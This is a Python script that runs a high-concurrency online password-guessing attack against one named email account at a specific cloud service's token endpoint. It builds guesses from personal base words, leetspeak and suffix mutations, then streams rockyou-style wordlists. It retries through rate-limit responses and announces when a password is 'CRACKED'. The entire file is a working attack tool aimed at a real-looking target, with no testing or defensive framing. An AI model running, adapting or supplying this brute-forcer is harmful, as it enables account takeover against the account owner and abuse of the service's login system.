import asyncio
import aiohttp
import time
import os

URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
EMAIL = "hobotzode1@gmail.com"
CONCURRENCY = 150
WORKERS = 150

CUSTOM_BASES = [
    "sezaze72", "Romart01", "sezaze", "romart", "Sezaze",
    "hobotzode", "hobotzode1", "Hobotzode1", "Hobotzode",
    "play2go", "Play2Go", "cloud", "Cloud",
    "play2gocloud", "Play2GoCloud", "vmmanager",
]

LEET = str.maketrans("aAeEiIoOsStT", "@@33!!00$$77")
LEET2 = str.maketrans("aAeEiIoOsStTlL", "4433!!0055771!")

SUFFIXES = [
    "", "!", "!!", "!!!", "1", "12", "123", "1234", "12345",
    "01", "00", "69", "77", "88", "99", "007",
    "!@", "!@#", "@", "#", "$", "*", "?",
    "2024", "2025", "2026", "_", "-",
]

PREFIXES = ["", "!", "@", "1", "123"]

WORDLISTS = ["rockyou_full.txt", "ncsc100k.txt", "rockyou75.txt"]

found = False
tried = 0
start_time = 0


async def worker(session, queue):
    global found, tried
    while not found:
        pw = await queue.get()
        if pw is None:
            queue.task_done()
            break
        try:
            t0 = time.time()
            async with session.post(
                URL, json={"email": EMAIL, "password": pw},
                ssl=False, timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                tried += 1
                ms = (time.time() - t0) * 1000
                elapsed = time.time() - start_time
                rps = tried / elapsed if elapsed > 0 else 0
                if resp.status == 200:
                    data = await resp.json()
                    found = True
                    print(f"\n{'='*50}")
                    print(f"[+] CRACKED! >>> {pw} <<< [{ms:.0f}ms] HTTP 200")
                    print(f"[+] Response: {data}")
                    print(f"[*] {tried:,} attempts in {elapsed:.1f}s ({rps:.0f} req/s)")
                    queue.task_done()
                    return
                if resp.status == 502 or resp.status == 429:
                    await asyncio.sleep(0.05)
                    try:
                        async with session.post(
                            URL, json={"email": EMAIL, "password": pw},
                            ssl=False, timeout=aiohttp.ClientTimeout(total=15)
                        ) as r2:
                            if r2.status == 200:
                                data = await r2.json()
                                found = True
                                print(f"\n{'='*50}")
                                print(f"[+] CRACKED! >>> {pw} <<< HTTP 200")
                                print(f"[+] Response: {data}")
                                queue.task_done()
                                return
                    except:
                        pass
                print(f"  [{tried:,}] {rps:.0f}r/s | {ms:5.0f}ms | {resp.status} | {pw}", flush=True)
        except Exception as e:
            tried += 1
            await asyncio.sleep(0.02)
            print(f"  [{tried:,}] ERR | {pw} | {e}", flush=True)
        queue.task_done()


async def main():
    global start_time
    start_time = time.time()
    queue = asyncio.Queue(maxsize=100000)

    connector = aiohttp.TCPConnector(
        limit=CONCURRENCY, limit_per_host=CONCURRENCY,
        ssl=False, ttl_dns_cache=300, enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        ws = [asyncio.create_task(worker(session, queue)) for _ in range(WORKERS)]

        # Phase 1: custom mutations
        print("[*] Phase 1: Custom mutations")
        seen = set()
        for base in CUSTOM_BASES:
            if found: break
            forms = [base, base.lower(), base.upper(), base.capitalize(),
                     base.swapcase(), base[::-1],
                     base.translate(LEET), base.translate(LEET2)]
            for f in forms:
                for pre in PREFIXES:
                    for suf in SUFFIXES:
                        pw = pre + f + suf
                        if pw not in seen and 4 <= len(pw) <= 40:
                            seen.add(pw)
                            await queue.put(pw)

        # Phase 1b: combos
        for a in CUSTOM_BASES[:8]:
            for b in CUSTOM_BASES[:8]:
                if a != b and not found:
                    for suf in ["", "!", "123", "1"]:
                        for pw in [a+b+suf, a+"_"+b+suf]:
                            if pw not in seen:
                                seen.add(pw)
                                await queue.put(pw)

        print(f"[*] Phase 1 done: {len(seen):,} custom")
        del seen

        # Phase 2: stream wordlists — no dedup, raw speed
        print("[*] Phase 2: Wordlists (no dedup, max speed)")
        for path in WORDLISTS:
            if found or not os.path.exists(path):
                continue
            print(f"  >> {path}")
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if found: break
                    b = line.strip()
                    if not b or len(b) < 4 or len(b) > 30: continue
                    await queue.put(b)
                    await queue.put(b.capitalize())
                    await queue.put(b + "!")
                    await queue.put(b + "123")
                    await queue.put(b.capitalize() + "!")
                    await queue.put(b + "!!")
                    await queue.put(b + "01")

        for _ in range(WORKERS):
            await queue.put(None)
        await asyncio.gather(*ws)

    elapsed = time.time() - start_time
    if not found:
        print(f"\n{'='*50}")
        print(f"[-] No match.")
    print(f"[*] Total: {tried:,} attempts, {elapsed:.1f}s ({tried/elapsed:.0f} req/s)")

if __name__ == "__main__":
    asyncio.run(main())
